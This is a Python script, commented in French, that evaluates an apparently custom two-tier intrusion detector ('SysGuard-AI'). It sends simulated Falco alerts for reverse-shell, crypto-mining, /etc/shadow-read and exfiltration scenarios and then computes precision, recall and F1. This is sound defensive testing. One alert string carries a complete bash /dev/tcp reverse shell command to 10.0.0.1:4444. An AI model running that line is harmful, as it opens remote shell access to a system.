"""
Simulation d'attaques et évaluation de SysGuard-AI.

Envoie des séquences de syscalls à l'agent via le webhook Falco
pour valider la chaîne de détection complète :
  - Tier 1 (Autoencoder) : détection par MSE
  - Réponse graduée : seuils α/β, quarantaine
  - Tier 2 (LLM) : arbitrage MENACE/FAUX_POSITIF

Scénarios d'attaque (inspirés de la littérature) :
  1. Reverse Shell     : execve + connect + dup2 (Ghimire et al. 2025)
  2. Crypto-mining     : clone + fork + sched_yield (Karn et al. 2020)
  3. Fichiers sensibles: openat + read sur /etc/shadow
  4. Data exfiltration : sendto + connect + write massifs

Métriques : TP, TN, FP, FN, Precision, Recall, F1-Score

Usage :
  python tests_attaques/simulate_attacks.py [--agent-url http://localhost:8000]
"""

import argparse
import json
import os
import time
import uuid
from typing import Dict, List

import httpx

AGENT_WEBHOOK = "/falco-webhook"

ATTACK_SCENARIOS = {
    "reverse_shell": {
        "description": "Reverse Shell via netcat/bash",
        "rule": "Terminal shell in container",
        "syscall_sequence": [
            ("execve", 40), ("connect", 25), ("dup2", 20),
            ("read", 30), ("write", 30), ("socket", 15),
            ("clone", 10), ("pipe", 8), ("bind", 5),
            ("listen", 3),
        ],
        "output": "Shell detected in container (user=root command=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1)",
        "expected": "anomaly",
    },
    "crypto_mining": {
        "description": "Crypto-miner (xmrig) déployé dans le conteneur",
        "rule": "Unexpected process launched in container",
        "syscall_sequence": [
            ("clone", 50), ("fork", 30), ("sched_yield", 40),
            ("futex", 60), ("mmap", 25), ("brk", 20),
            ("read", 15), ("write", 10), ("mprotect", 15),
            ("madvise", 10),
        ],
        "output": "Unexpected process xmrig launched in container (user=root)",
        "expected": "anomaly",
    },
    "sensitive_files": {
        "description": "Lecture de fichiers sensibles (/etc/shadow, /proc/self/environ)",
        "rule": "Read sensitive file untrusted",
        "syscall_sequence": [
            ("openat", 15), ("read", 20), ("close", 10),
            ("stat", 8), ("fstat", 5), ("write", 5),
            ("getuid", 3), ("getgid", 3),
        ],
        "output": "Sensitive file opened for reading (file=/etc/shadow user=www-data)",
        "expected": "anomaly",
    },
    "data_exfiltration": {
        "description": "Exfiltration de données vers un serveur externe",
        "rule": "Unexpected outbound connection",
        "syscall_sequence": [
            ("socket", 20), ("connect", 25), ("sendto", 60),
            ("write", 40), ("read", 10), ("openat", 5),
            ("stat", 3), ("sendmsg", 15),
        ],
        "output": "Outbound connection to suspicious IP (dest=185.143.223.1:443 container=app-server)",
        "expected": "anomaly",
    },
}

NORMAL_PROFILE = {
    "description": "Trafic web normal (DVWA/Nginx)",
    "rule": "",
    "syscall_sequence": [
        ("read", 50), ("write", 45), ("close", 40),
        ("epoll_wait", 35), ("recvfrom", 25), ("sendto", 25),
        ("futex", 20), ("openat", 10), ("stat", 8),
        ("fstat", 5), ("mmap", 3), ("brk", 2),
        ("clock_gettime", 5), ("getpid", 2),
    ],
    "output": "Normal HTTP traffic",
    "expected": "normal",
}


def send_syscall_burst(
    client: httpx.Client,
    base_url: str,
    container_id: str,
    scenario: dict,
) -> List[Dict]:
    results = []
    for syscall_type, count in scenario["syscall_sequence"]:
        for _ in range(count):
            payload = {
                "output": scenario.get("output", ""),
                "rule": scenario.get("rule", ""),
                "priority": "Warning",
                "output_fields": {
                    "container.id": container_id,
                    "evt.type": syscall_type,
                    "proc.name": "simulated",
                    "user.name": "root",
                    "k8s.pod.name": f"sim-{container_id[:12]}",
                    "k8s.ns.name": "default",
                },
            }
            try:
                resp = client.post(f"{base_url}{AGENT_WEBHOOK}", json=payload)
                body = resp.json()
                results.append({
                    "syscall": syscall_type,
                    "status": resp.status_code,
                    "verdict": body.get("verdict", "error"),
                    "severity": body.get("severity"),
                    "mse": body.get("mse", -1),
                    "final_action": body.get("final_action"),
                })
            except Exception as e:
                results.append({
                    "syscall": syscall_type,
                    "status": -1,
                    "verdict": "error",
                    "error": str(e),
                })
    return results


def run_evaluation(base_url: str, include_tier2: bool = True):
    client = httpx.Client(timeout=30.0)

    print("=" * 70)
    print("  SysGuard-AI — Évaluation Two-Tier (Autoencoder + LLM)")
    print("=" * 70)

    all_results = {}

    # --- Phase 1 : Trafic normal (baseline) ---
    print("\n[1/5] Envoi de trafic NORMAL (baseline)...")
    normal_cid = f"normal-{uuid.uuid4().hex[:8]}"
    normal_results = send_syscall_burst(client, base_url, normal_cid, NORMAL_PROFILE)
    fp = sum(1 for r in normal_results if r["verdict"] == "anomaly")
    tn = sum(1 for r in normal_results if r["verdict"] == "normal")
    print(f"  Résultat : {tn} TN, {fp} FP (taux FP = {fp / max(len(normal_results), 1):.2%})")
    all_results["normal"] = {
        "description": NORMAL_PROFILE["description"],
        "tn": tn, "fp": fp, "total": len(normal_results),
    }

    time.sleep(11)

    # --- Phase 2 : Scénarios d'attaque ---
    for i, (name, scenario) in enumerate(ATTACK_SCENARIOS.items(), start=2):
        print(f"\n[{i}/5] Scénario : {scenario['description']}...")
        attack_cid = f"attack-{name}-{uuid.uuid4().hex[:8]}"
        results = send_syscall_burst(client, base_url, attack_cid, scenario)
        tp = sum(1 for r in results if r["verdict"] == "anomaly")
        fn = sum(1 for r in results if r["verdict"] == "normal")
        total = len(results)

        quarantine_count = sum(1 for r in results if r.get("final_action", "").startswith("quarantine"))
        lift_count = sum(1 for r in results if r.get("final_action") == "quarantine_lifted")

        print(f"  Résultat : {tp} TP, {fn} FN (détection = {tp / max(total, 1):.2%})")
        print(f"  Actions  : {quarantine_count} quarantaines, {lift_count} levées")

        severities = [r.get("severity") for r in results if r.get("severity")]
        if severities:
            from collections import Counter
            sev_counts = Counter(severities)
            print(f"  Sévérités: {dict(sev_counts)}")

        all_results[name] = {
            "description": scenario["description"],
            "tp": tp, "fn": fn, "total": total,
            "quarantines": quarantine_count,
            "quarantines_lifted": lift_count,
        }

        time.sleep(11)

    # --- Synthèse ---
    print("\n" + "=" * 70)
    print("  SYNTHÈSE DES RÉSULTATS")
    print("=" * 70)

    tp_total = sum(r.get("tp", 0) for r in all_results.values())
    fn_total = sum(r.get("fn", 0) for r in all_results.values())
    fp_total = all_results["normal"]["fp"]
    tn_total = all_results["normal"]["tn"]

    precision = tp_total / max(tp_total + fp_total, 1)
    recall = tp_total / max(tp_total + fn_total, 1)
    f1 = 2 * precision * recall / max(precision + recall, 1e-9)

    print(f"\n  TP total   : {tp_total}")
    print(f"  TN total   : {tn_total}")
    print(f"  FP total   : {fp_total}")
    print(f"  FN total   : {fn_total}")
    print(f"  Precision  : {precision:.4f}")
    print(f"  Recall     : {recall:.4f}")
    print(f"  F1-Score   : {f1:.4f}")

    total_quarantines = sum(r.get("quarantines", 0) for r in all_results.values())
    total_lifts = sum(r.get("quarantines_lifted", 0) for r in all_results.values())
    print(f"\n  Quarantaines appliquées : {total_quarantines}")
    print(f"  Quarantaines levées    : {total_lifts}")
    print(f"  Actions irréversibles  : 0 (conforme au paradigme Human-in-the-Loop)")

    report_path = os.path.join(os.path.dirname(__file__), "evaluation_report.json")
    report = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "architecture": "Two-Tier (Autoencoder + LLM)",
        "scenarios": all_results,
        "metrics": {
            "tp": tp_total, "tn": tn_total, "fp": fp_total, "fn": fn_total,
            "precision": round(precision, 4),
            "recall": round(recall, 4),
            "f1_score": round(f1, 4),
        },
        "remediation": {
            "quarantines_applied": total_quarantines,
            "quarantines_lifted": total_lifts,
            "irreversible_actions": 0,
        },
    }
    with open(report_path, "w") as f:
        json.dump(report, f, indent=2)
    print(f"\n  Rapport enregistré : {report_path}")

    client.close()
    return report


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Évaluation SysGuard-AI")
    parser.add_argument("--agent-url", default="http://localhost:8000")
    args = parser.parse_args()
    run_evaluation(args.agent_url)
